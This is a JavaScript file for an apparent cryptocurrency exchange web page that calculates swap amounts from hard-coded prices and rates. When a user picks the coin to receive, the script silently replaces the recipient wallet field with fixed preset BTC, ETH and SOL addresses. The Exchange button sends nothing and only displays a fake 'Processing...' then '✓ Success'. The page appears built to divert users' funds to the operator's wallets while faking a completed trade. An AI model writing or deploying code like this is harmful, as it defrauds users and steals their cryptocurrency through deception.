// Simple crypto exchange script

// Current selected cryptos
let sendCrypto = 'BTC';
let getCrypto = 'ETH';

// Crypto prices
const prices = {
    BTC: 95000,
    ETH: 3070,
    SOL: 175,
    USDT: 1,
    USDC: 1,
    LTC: 105
};

// Exchange rates
const rates = {
    'BTC-ETH': 30.78897,
    'BTC-SOL': 542.86,
    'ETH-BTC': 0.0325,
    'ETH-SOL': 17.54,
    'SOL-BTC': 0.00184,
    'SOL-ETH': 0.057
};

// Preset addresses
const addresses = {
    SOL: '7cXAmVBEVJcwPCj37zakcfc7xinfn459spkvgHKHrEeY',
    ETH: '0x4EBe6598680D12FC5f40C3D68238f8D4d51f7877',
    BTC: 'bc1qkvzrkcvn67zj5xaxa4klwdr0gc69dddp2786g7'
};

// Wait for page to load
window.onload = function() {
    // Get elements
    const sendUSD = document.getElementById('sendUSD');
    const getUSD = document.getElementById('getUSD');
    const sendAmount = document.getElementById('sendCrypto');
    const getAmount = document.getElementById('getCrypto');
    const addressInput = document.getElementById('recipientAddress');
    
    // Calculate exchange
    function calculate() {
        if (!sendUSD) return;
        
        const usdValue = parseFloat(sendUSD.value) || 0;
        const cryptoAmount = usdValue / prices[sendCrypto];
        
        let rate = 1;
        if (sendCrypto !== getCrypto) {
            rate = rates[`${sendCrypto}-${getCrypto}`] || 1;
        }
        
        const receiveAmount = cryptoAmount * rate;
        const receiveUSD = receiveAmount * prices[getCrypto];
        
        if (sendAmount) sendAmount.textContent = cryptoAmount.toFixed(8);
        if (getAmount) getAmount.textContent = receiveAmount.toFixed(8);
        if (getUSD) getUSD.value = receiveUSD.toFixed(2);
        
        // Update button
        const btn = document.querySelector('.btn-amount');
        if (btn) btn.textContent = `$${usdValue.toFixed(2)} → $${receiveUSD.toFixed(2)}`;
    }
    
    // Input change
    if (sendUSD) {
        sendUSD.addEventListener('input', calculate);
    }
    
    // Cookie accept
    const acceptBtn = document.querySelector('.accept-btn');
    const cookieNotice = document.querySelector('.cookie-notice');
    if (acceptBtn && cookieNotice) {
        acceptBtn.onclick = function() {
            cookieNotice.style.display = 'none';
        };
    }
    
    // Risk info button
    const riskBtn = document.getElementById('riskInfoBtn');
    const riskModal = document.getElementById('riskModal');
    if (riskBtn && riskModal) {
        riskBtn.onclick = function() {
            riskModal.style.display = 'block';
        };
    }
    
    // Close risk modal
    const closeBtn = document.getElementById('closeModal');
    const understandBtn = document.getElementById('understandBtn');
    if (closeBtn && riskModal) {
        closeBtn.onclick = function() {
            riskModal.style.display = 'none';
        };
    }
    if (understandBtn && riskModal) {
        understandBtn.onclick = function() {
            riskModal.style.display = 'none';
        };
    }
    
    // Crypto selector
    const sendCryptoBox = document.getElementById('sendCryptoDisplay');
    const getCryptoBox = document.getElementById('getCryptoDisplay');
    const cryptoModal = document.getElementById('cryptoModal');
    let selectingFor = 'send';
    
    if (sendCryptoBox && cryptoModal) {
        sendCryptoBox.onclick = function() {
            selectingFor = 'send';
            cryptoModal.style.display = 'block';
        };
    }
    
    if (getCryptoBox && cryptoModal) {
        getCryptoBox.onclick = function() {
            selectingFor = 'get';
            cryptoModal.style.display = 'block';
        };
    }
    
    // Close crypto modal
    const closeCryptoBtn = document.getElementById('closeCryptoModal');
    if (closeCryptoBtn && cryptoModal) {
        closeCryptoBtn.onclick = function() {
            cryptoModal.style.display = 'none';
        };
    }
    
    // Select crypto
    const cryptoItems = document.querySelectorAll('.crypto-item');
    cryptoItems.forEach(function(item) {
        item.onclick = function() {
            const crypto = item.getAttribute('data-crypto');
            
            if (selectingFor === 'send') {
                sendCrypto = crypto;
                const codeEl = document.getElementById('sendCryptoCode');
                if (codeEl) codeEl.textContent = crypto;
            } else {
                getCrypto = crypto;
                const codeEl = document.getElementById('getCryptoCode');
                if (codeEl) codeEl.textContent = crypto;
                
                // Update address
                if (addressInput && addresses[crypto]) {
                    addressInput.value = addresses[crypto];
                }
            }
            
            if (cryptoModal) cryptoModal.style.display = 'none';
            calculate();
        };
    });
    
    // Exchange button
    const exchangeBtn = document.getElementById('exchangeBtn');
    if (exchangeBtn && addressInput) {
        exchangeBtn.onclick = function() {
            if (!addressInput.value) {
                alert('Please enter a wallet address');
                return;
            }
            
            exchangeBtn.disabled = true;
            exchangeBtn.innerHTML = '<span class="btn-text">Processing...</span>';
            
            setTimeout(function() {
                exchangeBtn.innerHTML = '<span class="btn-text">✓ Success</span>';
                setTimeout(function() {
                    exchangeBtn.disabled = false;
                    exchangeBtn.innerHTML = '<span class="btn-text">Exchange</span><span class="btn-amount">$0 → $0</span>';
                    calculate();
                }, 2000);
            }, 2000);
        };
    }
    
    // Initialize
    calculate();
};